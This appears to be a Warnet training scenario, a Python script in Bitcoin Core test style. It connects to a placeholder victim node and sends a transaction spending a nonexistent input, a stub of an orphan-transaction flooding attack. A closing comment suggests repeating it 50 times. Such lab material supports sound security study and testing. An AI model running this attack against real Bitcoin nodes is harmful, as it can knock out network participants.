#!/usr/bin/env python3

import random
import socket

from commander import Commander

# The entire Bitcoin Core test_framework directory is available as a library
from test_framework.messages import (
    hash256,
    msg_tx,
    COIN,
    CTransaction,
    CTxOut,
    CTxIn,
    COutPoint,
    SEQUENCE_FINAL,
)
from test_framework.script import CScript
from test_framework.p2p import MAGIC_BYTES, P2PInterface
from test_framework.script import CScript, OP_TRUE
from test_framework.address import script_to_p2sh, address_to_scriptpubkey


def get_signet_network_magic_from_node(node):
    template = node.getblocktemplate({"rules": ["segwit", "signet"]})
    challenge = template["signet_challenge"]
    challenge_bytes = bytes.fromhex(challenge)
    data = len(challenge_bytes).to_bytes() + challenge_bytes
    digest = hash256(data)
    return digest[0:4]


# The actual scenario is a class like a Bitcoin Core functional test.
# Commander is a subclass of BitcoinTestFramework instide Warnet
# that allows to operate on containerized nodes instead of local nodes.
class Orphan50(Commander):
    def set_test_params(self):
        # This setting is ignored but still required as
        # a sub-class of BitcoinTestFramework
        self.num_nodes = 1

    def add_options(self, parser):
        parser.description = (
            "Demonstrate orphan attack using a scenario and P2PInterface"
        )
        parser.usage = "warnet run /path/to/stub_orphan.py"

    # Scenario entrypoint
    def run_test(self):
        self.log.info("Starting orphan scenario")
        node = self.nodes[0]
        # create wallet miner, might already exist
        try:
            node.createwallet("miner", False, None, None, False, True, False)
        except:
            pass
        try:
            node.loadwallet("miner")
        except:
            pass

        # We pick a node on the network to attack
        # Find the node that is vulnerable to 50 orphans on fork-observer
        victim = "TARGET_TANK_NAME.default.svc"

        # regtest or signet
        chain = self.nodes[0].chain

        # The victim's address could be an explicit IP address
        # OR a kubernetes hostname (use default chain p2p port)
        dstaddr = socket.gethostbyname(victim)
        if chain == "regtest":
            dstport = 18444
        if chain == "signet":
            dstport = 38333
            MAGIC_BYTES["signet"] = get_signet_network_magic_from_node(self.nodes[0])

        # Now we will use a python-based Bitcoin p2p node to send very specific,
        # unusual or non-standard messages to a "victim" node.
        self.log.info(f"Attacking {victim}")
        attacker = P2PInterface()
        attacker.peer_connect(
            dstaddr=dstaddr, dstport=dstport, net="signet", timeout_factor=1
        )()
        attacker.wait_until(lambda: attacker.is_connected, check_connected=False)

        # make a transaction that spends an output that doesn't exist
        tx = CTransaction()

        tx.vin.append(
            CTxIn(
                COutPoint(
                    int(
                        # random made up input
                        "e3bb40caa4d604219a7394fdc8c72f1002b31b17ddcb01ddda3ccc8a20a0c183",
                        16,
                    ),
                    0,
                ),
            )
        )
        tx.vout.append(
            CTxOut(int(0.00009 * COIN), address_to_scriptpubkey(node.getnewaddress()))
        )

        tx.calc_sha256()

        print(tx.serialize().hex())

        attacker.send_and_ping(msg_tx(tx))

        # NOW perhhaps we could do this 50 times to the node that is vulnerable to 50 orphans??


def main():
    Orphan50().main()


if __name__ == "__main__":
    main()
